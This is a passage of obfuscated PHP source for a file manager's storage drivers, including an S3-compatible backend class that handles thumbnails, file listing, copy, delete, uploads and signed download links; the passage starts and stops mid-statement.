$«Ï½ò„ = $’±ŞÈ’[$å´áæÉİ[163]][$å´áæÉİ[170]]; } else { $«Ï½ò„ = md5("{$’±ŞÈ’[$å´áæÉİ[32]]}\x5f{$’±ŞÈ’[$å´áæÉİ[78]]}\137{$’±ŞÈ’[$å´áæÉİ[80]]}"); } } $ªéŞ¯ç° = "{$«Ï½ò„}\x5f{$á¸ÎÒğš}\x2e\160\156\x67"; if (!($ãÂŠªöş = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $å´áæÉİ[171]))) { $âğÏä÷˜ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $å´áæÉİ[172]); } else { $âğÏä÷˜ = KodIO::make($ãÂŠªöş); } if ($ãÂŠªöş = IO::fileNameExist($âğÏä÷˜, $ªéŞ¯ç°)) { $®‘†˜‘¾ = KodIO::make($ãÂŠªöş); return IO::fileOut($®‘†˜‘¾, !1, $úèãÏÔà); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $®‘†˜‘¾ = DATA_THUMB . $ªéŞ¯ç°; del_file($®‘†˜‘¾); if (!@file_exists($®‘†˜‘¾)) { $ü„“ã˜Å = TEMP_FILES; if (!is_dir($ü„“ã˜Å)) { mk_dir($ü„“ã˜Å); } $ß£ö»š = $ü„“ã˜Å . $«Ï½ò„ . $å´áæÉİ[10] . $’±ŞÈ’[$å´áæÉİ[167]]; if (!@file_exists($ß£ö»š)) { $ß£ö»š = $this->download($şƒÂö¥Ë, $ß£ö»š); } ImageThumb::createThumb($ß£ö»š, $®‘†˜‘¾, $á¸ÎÒğš, $á¸ÎÒğš * 10); } if (!file_exists($®‘†˜‘¾) || filesize($®‘†˜‘¾) < 100) { return @file_exists($ß£ö»š) ? IO::fileOut($ß£ö»š) : $this->fileOut($şƒÂö¥Ë); } if (!($ûŸçêÄ¦ = IO::move($®‘†˜‘¾, $âğÏä÷˜))) { return IO::fileOut($®‘†˜‘¾); } del_file($®‘†˜‘¾); IO::fileOut($ûŸçêÄ¦); } public function fileOutImageServer($àÃÄÛÏ , $ˆÓ×Ò± = 250) { $this->fileOutImage($àÃÄÛÏ , $ˆÓ×Ò±); } public function fileNameAuto($Ş“£¶Ş, $Ã¨ıé¨¬, $¸ëÆÂæà = REPEAT_RENAME, $åİñ¥Ó = false) { $ğÂÔÂ„Í =& $_SERVER[ì…™Î¶Ï]; $Šé¨œ€… = $Ş“£¶Ş === $ğÂÔÂ„Í[12] ? $Ã¨ıé¨¬ : rtrim($Ş“£¶Ş, $ğÂÔÂ„Í[8]) . $ğÂÔÂ„Í[8] . $Ã¨ıé¨¬; if ($¸ëÆÂæà == REPEAT_REPLACE || !$this->exist($Šé¨œ€…) || $åİñ¥Ó && $¸ëÆÂæà != REPEAT_RENAME_FOLDER) { return $Ã¨ıé¨¬; } if ($¸ëÆÂæà == REPEAT_SKIP) { return !1; } $²°›Ä­… = $ğÂÔÂ„Í[10] . get_path_ext($Ã¨ıé¨¬); $²°›Ä­… = $²°›Ä­… == $ğÂÔÂ„Í[10] || $åİñ¥Ó ? $ğÂÔÂ„Í[12] : $²°›Ä­…; $ŒÄ»À = 1; $¾— ı = substr($Ã¨ıé¨¬, 0, strlen($Ã¨ıé¨¬) - strlen($²°›Ä­…)); $‚µàæã = $¾— ı . "\x28{$ŒÄ»À}\x29{$²°›Ä­…}"; while ($this->exist(rtrim($Ş“£¶Ş, $ğÂÔÂ„Í[8]) . $ğÂÔÂ„Í[8] . $‚µàæã)) { $‚µàæã = $¾— ı . "\x28{$ŒÄ»À}\51{$²°›Ä­…}"; $ŒÄ»À++; } return $‚µàæã; } private function fileNameAutoList($ã¬Ÿ¸Ï, $æ¶İùÀ©, $–€¥º‘† = false) { $•ğ¹¢·® =& $_SERVER[ì…™Î¶Ï]; $éö†‘æ¹ = $this->listPath($ã¬Ÿ¸Ï, !0); $éö†‘æ¹ = array_merge($éö†‘æ¹[$•ğ¹¢·®[77]], $éö†‘æ¹[$•ğ¹¢·®[76]]); $€©´Ã†“ = array_to_keyvalue($éö†‘æ¹, $•ğ¹¢·®[12], $•ğ¹¢·®[32]); $ÊÔÅƒ‰ = $•ğ¹¢·®[10] . get_path_ext($æ¶İùÀ©); $ÊÔÅƒ‰ = $ÊÔÅƒ‰ == $•ğ¹¢·®[10] || $–€¥º‘† ? $•ğ¹¢·®[12] : $ÊÔÅƒ‰; $å¡•¾ç» = substr($æ¶İùÀ©, 0, strlen($æ¶İùÀ©) - strlen($ÊÔÅƒ‰)); $êô”û—£ = $å¡•¾ç» . "\x28\x30\51{$ÊÔÅƒ‰}"; for ($ãæ¬ı÷Ô = 1; $ãæ¬ı÷Ô <= count($€©´Ã†“) + 1; $ãæ¬ı÷Ô++) { $êô”û—£ = $å¡•¾ç» . "\x28{$ãæ¬ı÷Ô}\51{$ÊÔÅƒ‰}"; if (!in_array_not_case($êô”û—£, $€©´Ã†“)) { return $êô”û—£; } } return $êô”û—£; } public function listAllFiles($Íø“‡÷, $†Ô‚÷èÉ, $×ÚÂ‰ÏÛ = array()) { $‹€ÆˆŒ± =& $_SERVER[ì…™Î¶Ï]; if (empty($†Ô‚÷èÉ)) { return array(); } $Ÿ€ª‰Í¬ = array(); $Íø“‡÷ = trim($Íø“‡÷, $‹€ÆˆŒ±[8]); foreach ($†Ô‚÷èÉ as $’È’ºó) { $û½Æ×¨ı = ltrim(substr(trim($’È’ºó, $‹€ÆˆŒ±[8]), strlen($Íø“‡÷)), $‹€ÆˆŒ±[8]); $Ÿ€ª‰Í¬ = array_merge($Ÿ€ª‰Í¬, $this->slicePath($û½Æ×¨ı)); } $æÕÀ­‘È = array(); foreach (array_unique($Ÿ€ª‰Í¬) as $’È’ºó) { $˜”¡ª§¤ = array($‹€ÆˆŒ±[78] => $this->getPathOuter($‹€ÆˆŒ±[8] . $Íø“‡÷ . $‹€ÆˆŒ±[8] . $’È’ºó), $‹€ÆˆŒ±[79] => 1, $‹€ÆˆŒ±[80] => 0); if (substr($’È’ºó, -1) != $‹€ÆˆŒ±[8]) { $˜”¡ª§¤[$‹€ÆˆŒ±[79]] = 0; $ã·ûùİõ = $this->getPath($Íø“‡÷ . $‹€ÆˆŒ±[8] . $’È’ºó); $˜”¡ª§¤[$‹€ÆˆŒ±[80]] = isset($×ÚÂ‰ÏÛ[$ã·ûùİõ]) ? $×ÚÂ‰ÏÛ[$ã·ûùİõ] : $this->size($ã·ûùİõ); } $æÕÀ­‘È[] = $˜”¡ª§¤; } return $æÕÀ­‘È; } public function slicePath($à…ëŞ´„) { $äÕ½° =& $_SERVER[ì…™Î¶Ï]; $„«Õ¤à = explode($äÕ½°[8], trim($à…ëŞ´„, $äÕ½°[8])); $ı‹çãğÕ = 0; do { ++$ı‹çãğÕ; $âéÍ×«†[] = implode($äÕ½°[8], array_slice($„«Õ¤à, 0, $ı‹çãğÕ)) . $äÕ½°[8]; } while ($ı‹çãğÕ < count($„«Õ¤à)); $âéÍ×«†[count($„«Õ¤à) - 1] = $à…ëŞ´„; return $âéÍ×«†; } public function getHost() { $‚«Õ£Ğ« =& $_SERVER[ì…™Î¶Ï]; $¦Å®»‡º = parse_url(trim($this->domain, $‚«Õ£Ğ«[8])); $•š£Éûì = isset($¦Å®»‡º[$‚«Õ£Ğ«[173]]) ? $¦Å®»‡º[$‚«Õ£Ğ«[173]] : http_type(); $²¾Ñ§¸÷ = isset($¦Å®»‡º[$‚«Õ£Ğ«[174]]) ? $¦Å®»‡º[$‚«Õ£Ğ«[174]] : $¦Å®»‡º[$‚«Õ£Ğ«[78]]; if (isset($¦Å®»‡º[$‚«Õ£Ğ«[175]])) { $²¾Ñ§¸÷ .= $‚«Õ£Ğ«[4] . $¦Å®»‡º[$‚«Õ£Ğ«[175]]; } return $•š£Éûì . $‚«Õ£Ğ«[176] . $²¾Ñ§¸÷; } public function pathEncode($ß‹İ×Ë‰) { $†¦Æ±ñÚ =& $_SERVER[ì…™Î¶Ï]; return str_replace($†¦Æ±ñÚ[177], $†¦Æ±ñÚ[8], rawurlencode($ß‹İ×Ë‰)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($”ÓÀÚã) { set_timeout(); require_once SDK_DIR . $_SERVER[ì…™Î¶Ï][178]; parent::__construct(); $this->_init($”ÓÀÚã); } public function _init($í°Œ©ŠĞ) { foreach ($í°Œ©ŠĞ as $öéÔüÀ¼ => $×ˆ³“Û¨) { if (isset($this->{$öéÔüÀ¼})) { $this->{$öéÔüÀ¼} = $×ˆ³“Û¨; } } $this->endpoint = $í°Œ©ŠĞ[$_SERVER[ì…™Î¶Ï][179]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ø’úö±· = "\x76\x34") { $this->signVer = $ø’úö±·; $this->client->setSignatureVersion($ø’úö±·); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $é¦ÀÉĞ =& $_SERVER[ì…™Î¶Ï]; $›ğ ©¤¿ = $this->getBucketCors(); if (!$›ğ ©¤¿ || !is_array($›ğ ©¤¿)) { return !1; } if ($›ğ ©¤¿[$é¦ÀÉĞ[180]] != $é¦ÀÉĞ[181] || $›ğ ©¤¿[$é¦ÀÉĞ[182]] != $é¦ÀÉĞ[181]) { return !1; } $Å¡Ï„éá = array_map($é¦ÀÉĞ[183], $›ğ ©¤¿[$é¦ÀÉĞ[184]]); if (!is_array($Å¡Ï„éá)) { $Å¡Ï„éá = array(); } $ö·ŒıÑ = array($é¦ÀÉĞ[185], $é¦ÀÉĞ[186], $é¦ÀÉĞ[187], $é¦ÀÉĞ[188], $é¦ÀÉĞ[189]); $Û×‹µÖÅ = array_diff($ö·ŒıÑ, $Å¡Ï„éá); return empty($Û×‹µÖÅ); } public function mkfile($Š«²Î•, $ı·—Ÿóğ = '', $è¾İ˜ó = REPEAT_RENAME) { $´Ä§¸ª¶ = $this->setContent($Š«²Î•, $ı·—Ÿóğ); if ($´Ä§¸ª¶ !== !1) { return $this->getPathOuter($Š«²Î•); } return !1; } public function mkdir($Ê»íÕ¶, $ÎÇîÇ¤ã = REPEAT_SKIP) { $Îà’âÒš =& $_SERVER[ì…™Î¶Ï]; if (empty($Ê»íÕ¶) && $Ê»íÕ¶ !== $Îà’âÒš[190]) { return !1; } if ($this->_isFolder($Ê»íÕ¶)) { return $this->getPathOuter($Ê»íÕ¶); } $çú¡²àÕ = $this->setContent($Ê»íÕ¶, $Îà’âÒš[12], !0); if ($çú¡²àÕ !== !1) { return $this->getPathOuter($Ê»íÕ¶); } return !1; } public function copyFile($šˆºš½æ, $Ø»–Íé, $¦Âä¤Ùš = array()) { $×§º°ÉÜ =& $_SERVER[ì…™Î¶Ï]; $±“şÉ‹á = $this->objectMeta($šˆºš½æ); if (!$±“şÉ‹á) { return !1; } if ($±“şÉ‹á[$×§º°ÉÜ[80]] <= 1024 * 1024 * 200) { $ßˆîı–™ = $this->client->copyObject($this->bucket, $šˆºš½æ, $this->bucket, $Ø»–Íé, $×§º°ÉÜ[191], $¦Âä¤Ùš); } else { $ßˆîı–™ = $this->client->multiCopyObject($this->bucket, $šˆºš½æ, $this->bucket, $Ø»–Íé, $¦Âä¤Ùš); } $ßˆîı–™ = $ßˆîı–™ ? $this->getPathOuter($Ø»–Íé) : !1; return $ßˆîı–™; } public function moveFile($¦Î³Ï», $åúÊİ£ì) { if ($this->copyFile($¦Î³Ï», $åúÊİ£ì)) { $this->delFile($¦Î³Ï»); return $this->getPathOuter($åúÊİ£ì); } return !1; } public function delFile($œûõ¡’) { return $this->client->deleteObject($this->bucket, $œûõ¡’); } public function delFolder($ ”Š’š´) { $‰‚İüé× =& $_SERVER[ì…™Î¶Ï]; if (!$this->exist($ ”Š’š´)) { return !0; } $this->listItemCache = !1; $£ã‚üæì = $this->fileList($ ”Š’š´); $this->listItemCache = !0; $¥Œù»ä = trim($ ”Š’š´, $‰‚İüé×[8]) . $‰‚İüé×[8]; if (!empty($ ”Š’š´) && $ ”Š’š´ !== $‰‚İüé×[190] && !in_array($¥Œù»ä, $£ã‚üæì[$‰‚İüé×[77]])) { $£ã‚üæì[$‰‚İüé×[77]][] = $¥Œù»ä; } $ŠÍ–Å× = $this->delByBatch($£ã‚üæì[$‰‚İüé×[76]]); if (!$ŠÍ–Å×) { return !1; } $ŠÍ–Å× = $this->delByBatch($£ã‚üæì[$‰‚İüé×[77]]); if (!$ŠÍ–Å×) { return !1; } return $this->delFile($¥Œù»ä); } private function delByBatch($§Ì¼ç¡) { foreach (array_chunk($§Ì¼ç¡, 1000) as $ˆÇÔ»“ğ) { $ÖîÜóöØ = $this->client->deleteObjects($this->bucket, $ˆÇÔ»“ğ); if (!$ÖîÜóöØ) { return !1; } } return !0; } public function rename($–‹äô, $ùâ¦â“) { return $this->renameObject($–‹äô, $ùâ¦â“); } public function listPath($ÄåŞãó¤, $„ÖŒù³¿ = false) { $Â‚„øÓ» =& $_SERVER[ì…™Î¶Ï]; $Í×¬­Î = $this->fileList($ÄåŞãó¤, $Â‚„øÓ»[8], !0); foreach ($Í×¬­Î[$Â‚„øÓ»[77]] as $éÃ¹óŞã => $¼’Ò¨Â²) { $Í×¬­Î[$Â‚„øÓ»[77]][$éÃ¹óŞã] = $this->folderInfo($¼’Ò¨Â², $„ÖŒù³¿); } foreach ($Í×¬­Î[$Â‚„øÓ»[76]] as $éÃ¹óŞã => $¼’Ò¨Â²) { $Í×¬­Î[$Â‚„øÓ»[76]][$éÃ¹óŞã] = $this->fileInfo($¼’Ò¨Â²[$Â‚„øÓ»[32]], $„ÖŒù³¿, $¼’Ò¨Â²); } return $Í×¬­Î; } private function fileInfo($¹ÙõÍâ, $–­Êòµ‰ = false, $Ş™€ó¯ø = array()) { $Ò¹ŸÌÑ˜ =& $_SERVER[ì…™Î¶Ï]; $õò÷ã™™ = array($Ò¹ŸÌÑ˜[32] => $this->pathThis($¹ÙõÍâ), $Ò¹ŸÌÑ˜[78] => $this->getPathOuter($¹ÙõÍâ), $Ò¹ŸÌÑ˜[33] => $Ò¹ŸÌÑ˜[192], $Ò¹ŸÌÑ˜[167] => $this->ext($¹ÙõÍâ), $Ò¹ŸÌÑ˜[80] => isset($Ş™€ó¯ø[$Ò¹ŸÌÑ˜[80]]) ? $Ş™€ó¯ø[$Ò¹ŸÌÑ˜[80]] : 0); if ($–­Êòµ‰) { return $õò÷ã™™; } $õò÷ã™™[$Ò¹ŸÌÑ˜[193]] = $õò÷ã™™[$Ò¹ŸÌÑ˜[86]] = 0; $õò÷ã™™[$Ò¹ŸÌÑ˜[194]] = $õò÷ã™™[$Ò¹ŸÌÑ˜[195]] = !0; if (empty($Ş™€ó¯ø)) { $Ş™€ó¯ø = $this->objectMeta($¹ÙõÍâ); if (!$Ş™€ó¯ø) { return $õò÷ã™™; } } if (isset($Ş™€ó¯ø[$Ò¹ŸÌÑ˜[196]])) { $õò÷ã™™[$Ò¹ŸÌÑ˜[86]] = $Ş™€ó¯ø[$Ò¹ŸÌÑ˜[196]]; } if (isset($Ş™€ó¯ø[$Ò¹ŸÌÑ˜[80]])) { $õò÷ã™™[$Ò¹ŸÌÑ˜[80]] = $Ş™€ó¯ø[$Ò¹ŸÌÑ˜[80]]; } return $õò÷ã™™; } private function folderInfo($‘è±’¨, $îâ¾¸éò = false) { $Ö„å¸Áè =& $_SERVER[ì…™Î¶Ï]; $ºœØÊ‘´ = array($Ö„å¸Áè[32] => $this->pathThis($‘è±’¨), $Ö„å¸Áè[78] => $this->getPathOuter($Ö„å¸Áè[8] . $‘è±’¨), $Ö„å¸Áè[33] => $Ö„å¸Áè[79]); if ($îâ¾¸éò) { return $ºœØÊ‘´; } $ºœØÊ‘´[$Ö„å¸Áè[193]] = $ºœØÊ‘´[$Ö„å¸Áè[86]] = 0; $ºœØÊ‘´[$Ö„å¸Áè[194]] = $ºœØÊ‘´[$Ö„å¸Áè[195]] = !0; if ($‘è±’¨ == $Ö„å¸Áè[12]) { return $ºœØÊ‘´; } $‘è±’¨ = trim($‘è±’¨, $Ö„å¸Áè[8]) . $Ö„å¸Áè[8]; $½¯Á»á– = $this->objectMeta($‘è±’¨); if (isset($½¯Á»á–[$Ö„å¸Áè[196]])) { $ºœØÊ‘´[$Ö„å¸Áè[193]] = $½¯Á»á–[$Ö„å¸Áè[196]]; } return $ºœØÊ‘´; } private function fileList($çÇñş‹, $»ÉÓéìù = '', $Ú¿ôÔÁ = 0) { $ØÏóµØˆ =& $_SERVER[ì…™Î¶Ï]; $ßª¬È¢ˆ = rtrim($çÇñş‹, $ØÏóµØˆ[8]) . $ØÏóµØˆ[8]; $ó–¯Æ´ = $this->listObjs($ßª¬È¢ˆ, null, null, $»ÉÓéìù); if (!$ó–¯Æ´) { return array($ØÏóµØˆ[77] => array(), $ØÏóµØˆ[76] => array()); } $´…Ñö¼ = $this->listItemCache === !1 ? !1 : !0; $·®Õ½»Ø = $ñÖ»şØù = array(); foreach ($ó–¯Æ´[$ØÏóµØˆ[197]] as $Ú«˜±®Ã) { $ç®¹ôĞİ = $Ú«˜±®Ã[$ØÏóµØˆ[32]]; if ($ç®¹ôĞİ == $ßª¬È¢ˆ) { continue; } $’–¤¾€µ = isset($Ú«˜±®Ã[$ØÏóµØˆ[80]]) ? $Ú«˜±®Ã[$ØÏóµØˆ[80]] : 0; $Ëš‡ı˜Á = $’–¤¾€µ == 0 && substr($ç®¹ôĞİ, strlen($ç®¹ôĞİ) - 1, 1) == $ØÏóµØˆ[8] ? !0 : !1; if ($´…Ñö¼) { $this->cacheMethod($ØÏóµØˆ[198], $ç®¹ôĞİ, $Ëš‡ı˜Á); $this->cacheMethod($ØÏóµØˆ[199], $ç®¹ôĞİ, $Ú«˜±®Ã); } if ($Ëš‡ı˜Á) { $·®Õ½»Ø[] = $ç®¹ôĞİ; continue; } $ñÖ»şØù[] = $Ú¿ôÔÁ ? $Ú«˜±®Ã : $ç®¹ôĞİ; } foreach ($ó–¯Æ´[$ØÏóµØˆ[200]] as $Ú«˜±®Ã) { $·®Õ½»Ø[] = $Ú«˜±®Ã[$ØÏóµØˆ[32]]; if ($´…Ñö¼) { $this->cacheMethod($ØÏóµØˆ[198], $Ú«˜±®Ã[$ØÏóµØˆ[32]], !0); } } if ($´…Ñö¼) { $this->cacheMethod($ØÏóµØˆ[198], $çÇñş‹, !0); } return array($ØÏóµØˆ[77] => $·®Õ½»Ø, $ØÏóµØˆ[76] => $ñÖ»şØù); } private function listObjs($¶÷Ş·¶–, $öÆèËº‹ = null, $µ±ëÇŠé = null, $òÅÑßŒù = null) { $ğîØ´­¦ =& $_SERVER[ì…™Î¶Ï]; $¶÷Ş·¶– = trim($¶÷Ş·¶–, $ğîØ´­¦[8]); $Ë¬éĞÏ = empty($¶÷Ş·¶–) && $¶÷Ş·¶– !== $ğîØ´­¦[190] ? $ğîØ´­¦[12] : $¶÷Ş·¶– . $ğîØ´­¦[8]; return $this->client->getBucket($this->bucket, $Ë¬éĞÏ, $öÆèËº‹, $µ±ëÇŠé, $òÅÑßŒù, !0); } public function has($–Çè¶×ª, $ÎÔ‹‹æ€ = false, $Œ¡öµ™İ = true) { $õ¹ŠĞÚĞ =& $_SERVER[ì…™Î¶Ï]; $–Çè¶×ª = trim($–Çè¶×ª, $õ¹ŠĞÚĞ[8]); $À×’¾Ï = empty($–Çè¶×ª) && $–Çè¶×ª !== $õ¹ŠĞÚĞ[190] ? $õ¹ŠĞÚĞ[12] : $–Çè¶×ª . $õ¹ŠĞÚĞ[8]; $›´“ß¦¿ = null; $«ÏËœÒÙ = 500; $çıÏõ£˜ = $õ¹ŠĞÚĞ[8]; $´›±©õ» = $ÈÀîáı = array(); while (!0) { $¯Ìê—š¬ = $this->listObjs($–Çè¶×ª, $›´“ß¦¿, $«ÏËœÒÙ, $çıÏõ£˜); if (!$¯Ìê—š¬) { break; } $›´“ß¦¿ = $¯Ìê—š¬[$õ¹ŠĞÚĞ[201]]; $ö¯åŒé = $¯Ìê—š¬[$õ¹ŠĞÚĞ[197]]; $ßâªÂğî = $¯Ìê—š¬[$õ¹ŠĞÚĞ[200]]; if (empty($ö¯åŒé) && empty($ßâªÂğî)) { break; } if (count($ö¯åŒé) == 1 && $ö¯åŒé[0][$õ¹ŠĞÚĞ[32]] == $À×’¾Ï) { break; } if ($ÎÔ‹‹æ€) { if (count($ö¯åŒé)) { $ö¯åŒé = array_column($ö¯åŒé, $õ¹ŠĞÚĞ[32]); $´›±©õ» = array_merge($´›±©õ», $ö¯åŒé); } if (count($ßâªÂğî)) { $ßâªÂğî = array_column($ßâªÂğî, $õ¹ŠĞÚĞ[32]); $ÈÀîáı = array_merge($ÈÀîáı, $ßâªÂğî); } if ($›´“ß¦¿ === null) { break; } continue; } if ($Œ¡öµ™İ) { if (!empty($ö¯åŒé)) { if (count($ö¯åŒé) > 1 || isset($ö¯åŒé[0][$õ¹ŠĞÚĞ[32]]) && $ö¯åŒé[0][$õ¹ŠĞÚĞ[32]] != $À×’¾Ï) { return !0; } } } else { if (!empty($ßâªÂğî)) { return !0; } } if ($›´“ß¦¿ === null) { break; } } if ($ÎÔ‹‹æ€) { $´›±©õ» = array_diff($´›±©õ», array($À×’¾Ï)); $´›±©õ» = count(array_unique($´›±©õ»)); $ÈÀîáı = count(array_unique($ÈÀîáı)); return array($õ¹ŠĞÚĞ[202] => $´›±©õ», $õ¹ŠĞÚĞ[203] => $ÈÀîáı); } return !1; } public function listAll($Ş÷Ó§“) { $¹Ò£ğ =& $_SERVER[ì…™Î¶Ï]; $úó­ÈÎ» = $this->fileList($Ş÷Ó§“, $¹Ò£ğ[12], !0); $úıµÃşï = array(); foreach ($úó­ÈÎ»[$¹Ò£ğ[76]] as $‘ÌüîÎô) { $úıµÃşï[$‘ÌüîÎô[$¹Ò£ğ[32]]] = $‘ÌüîÎô[$¹Ò£ğ[80]]; } foreach ($úó­ÈÎ»[$¹Ò£ğ[77]] as $‘ÌüîÎô) { if (is_string($‘ÌüîÎô)) { $úıµÃşï[$‘ÌüîÎô] = 0; } } return $this->listAllFiles($Ş÷Ó§“, array_keys($úıµÃşï), $úıµÃşï); } public function canRead($©²¤şøÃ) { $“óÆù¿Ÿ =& $_SERVER[ì…™Î¶Ï]; $„“¦¯é× = $this->client->getAccessControlPolicy($this->bucket, $©²¤şøÃ); if (!$„“¦¯é×) { return !1; } return in_array($„“¦¯é×, array($“óÆù¿Ÿ[204], $“óÆù¿Ÿ[205], $“óÆù¿Ÿ[206])) ? !0 : !1; } public function canWrite($ÍÊŠÏä) { $Øíà¿ù§ =& $_SERVER[ì…™Î¶Ï]; $·Ò¢¼Ä = $this->client->getAccessControlPolicy($this->bucket, $ÍÊŠÏä); if (!$·Ò¢¼Ä) { return !1; } return in_array($·Ò¢¼Ä, array($Øíà¿ù§[204], $Øíà¿ù§[205])) ? !0 : !1; } public function getContent($óÂÖÀÇ®) { return $this->client->getObject($this->bucket, $óÂÖÀÇ®); } public function setContent($íÔÕ³Øö, $¬œ¯¢ê = '', $½€“‚İã = false) { $çØî»½Ù =& $_SERVER[ì…™Î¶Ï]; $íÔÕ³Øö = $½€“‚İã ? trim($íÔÕ³Øö, $çØî»½Ù[8]) . $çØî»½Ù[8] : $íÔÕ³Øö; $§›Í×Ìô = get_file_mime(get_path_ext($íÔÕ³Øö)); $ê°Áâæë = $this->client->putObject($¬œ¯¢ê, $this->bucket, $íÔÕ³Øö, $çØî»½Ù[191], array(), $§›Í×Ìô); if (!$ê°Áâæë) { return !1; } if ($½€“‚İã) { return !0; } $this->cacheMethod(null, null); $ê°Áâæë = $this->copyFile($íÔÕ³Øö, $íÔÕ³Øö, array($çØî»½Ù[207] => $ê°Áâæë[$çØî»½Ù[208]])); return $ê°Áâæë ? !0 : !1; } public function fileSubstr($Ì‰—¼, $Æ’½ãû¦, $®£İÁÒ˜) { $ù´‹ºøï = $Æ’½ãû¦ + $®£İÁÒ˜ - 1; return $this->client->getObject($this->bucket, $Ì‰—¼, array($_SERVER[ì…™Î¶Ï][209] => "\x62\171\x74\x65\x73\x3d{$Æ’½ãû¦}\55{$ù´‹ºøï}")); } public function upload($Ú»¼¦üá, $ªúç•Èœ, $šŞ–¼æ¼ = false, $ƒ¸íÒî = REPEAT_REPLACE) { $ÌÉ’Ñï¹ =& $_SERVER[ì…™Î¶Ï]; $å™“Ğã‘ = array($ÌÉ’Ñï¹[207] => @md5_file($ªúç•Èœ)); $œåŸâ¬» = array($ÌÉ’Ñï¹[210] => get_file_mime(get_path_ext($Ú»¼¦üá))); if (IO::size($ªúç•Èœ) <= 1024 * 1024 * 200) { $î—€“­¯ = $this->client->putObjectFile($ªúç•Èœ, $this->bucket, $Ú»¼¦üá, $ÌÉ’Ñï¹[191], $å™“Ğã‘, $œåŸâ¬»); return !empty($î—€“­¯) ? $this->getPathOuter($Ú»¼¦üá) : !1; } $ğÃÔÁä = $this->client->multiUploadObject($ªúç•Èœ, $this->bucket, trim($Ú»¼¦üá, $ÌÉ’Ñï¹[8]), $å™“Ğã‘, $œåŸâ¬»); return $ğÃÔÁä ? $this->getPathOuter($Ú»¼¦üá) : !1; } public function download($¹²†Ô³Ë, $‹ì©¼Åñ) { if (!@is_dir($this->pathFather($‹ì©¼Åñ)) && !IO::mkdir($this->pathFather($‹ì©¼Åñ))) { return !1; } $ìŒæĞé® = $this->client->getObject($this->bucket, $¹²†Ô³Ë, array(), $‹ì©¼Åñ); return $ìŒæĞé® !== !1 ? $‹ì©¼Åñ : !1; } public function link($Á«ÎäãŒ, $››¨ŸÜ = array()) { $÷Ã¢õÔ£ =& $_SERVER[ì…™Î¶Ï]; if ($this->signVer == $÷Ã¢õÔ£[211]) { return $this->client->getAuthenticatedURL($this->bucket, $Á«ÎäãŒ, 3600 * 12, $››¨ŸÜ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Á«ÎäãŒ, $÷Ã¢õÔ£[8]), 3600 * 12, $this->region, array(), !0, $››¨ŸÜ); } public function fileOut($¦öñ ‹, $ë˜¿ÃÍÓ = false, $—©¼á˜« = false, $ÒÒ¦±€Ù = '') { $æ½—¬‰¤ =& $_SERVER[ì…™Î¶Ï]; if ($this->isFileOutServer()) { return $this->fileOutServer($¦öñ ‹, $ë˜¿ÃÍÓ, $—©¼á˜«, $ÒÒ¦±€Ù); } if (!$—©¼á˜«) { $—©¼á˜« = $this->pathThis($¦öñ ‹); } $‘Ÿ™€¨€ = get_file_mime(get_path_ext($—©¼á˜«)); if ($‘Ÿ™€¨€ == $æ½—¬‰¤[212]) { return parent::fileOut($¦öñ ‹, $ë˜¿ÃÍÓ, $—©¼á˜«, $ÒÒ¦±€Ù); } $°Ä”ÂÄÑ = array($æ½—¬‰¤[213] => $‘Ÿ™€¨€); if ($ë˜¿ÃÍÓ) { $°Ä”ÂÄÑ[$æ½—¬‰¤[214]] = $æ½—¬‰¤[215] . rawurlencode($—©¼á˜«); } else { } $¥ıî™Şâ = $this->link($¦öñ ‹, $°Ä”ÂÄÑ); $this->fileOutLink($¥ıî™Şâ); } public function fileOutServer($Æªáâø†, $—¤·Ğ¥ş = false, $¹ÜÅĞã• = false, $Í’¨Ğ° = '') { parent::fileOut($Æªáâø†, $—¤·Ğ¥ş, $¹ÜÅĞã•, $Í’¨Ğ°); } public function fileOutImageServer($‚ÔÆ³¾¤, $æ®ÁâôÛ = 250) { parent::fileOutImage($‚ÔÆ³¾¤, $æ®ÁâôÛ); } public function hashMd5($õËÇ¼€¿, $´ÑëÂ» = '') { $Ïş…ì…Ë =& $_SERVER[ì…™Î¶Ï]; $À‹ÒÀ‹‚ = $this->objectMeta($õËÇ¼€¿); if (!$À‹ÒÀ‹‚) { return !1; } $´ÑëÂ» = $´ÑëÂ» ? $´ÑëÂ» : _get($À‹ÒÀ‹‚, $Ïş…ì…Ë[216]); $´ÑëÂ» = $´ÑëÂ» ? $´ÑëÂ» : _get($À‹ÒÀ‹‚, $Ïş…ì…Ë[208], $Ïş…ì…Ë[12]); return $´ÑëÂ»; } public function uploadFormData($¬ê©ÅÛ, $†ÄŠÃ«ï = 3600) { $Çíî•Œƒ =& $_SERVER[ì…™Î¶Ï]; $Ç½ÑÃ–— = $this->pathFather($¬ê©ÅÛ); $ØÆæ¸š’ = $this->client->getHttpUploadPostParams($this->bucket, $Ç½ÑÃ–—, $Çíî•Œƒ[191], $†ÄŠÃ«ï); return array_merge((array) $ØÆæ¸š’, array($Çíî•Œƒ[174] => $this->getHost())); } public function multiUploadFormData($¸¢Àáó², $ß­£¾„— = 3600) { $µÜìÜÔ =& $_SERVER[ì…™Î¶Ï]; $êØšï½ï = gmdate($µÜìÜÔ[217]); $á´€¿§Û = array(); $‹èÀçÃ = $this->client->getUploadId($this->bucket, $¸¢Àáó², $á´€¿§Û); if (!$‹èÀçÃ) { return !1; } return array($µÜìÜÔ[218] => $‹èÀçÃ, $µÜìÜÔ[174] => $this->getHost() . $µÜìÜÔ[8] . $this->pathEncode($¸¢Àáó²), $µÜìÜÔ[219] => $êØšï½ï, $µÜìÜÔ[95] => $¸¢Àáó²); } public function multiUploadAuthData($Şş¤­‰, $óÅ¿…ù¯ = array()) { $® ŸÜñ» =& $_SERVER[ì…™Î¶Ï]; $Ì­ßŠç = isset($óÅ¿…ù¯[$® ŸÜñ»[219]]) ? $óÅ¿…ù¯[$® ŸÜñ»[219]] : gmdate($® 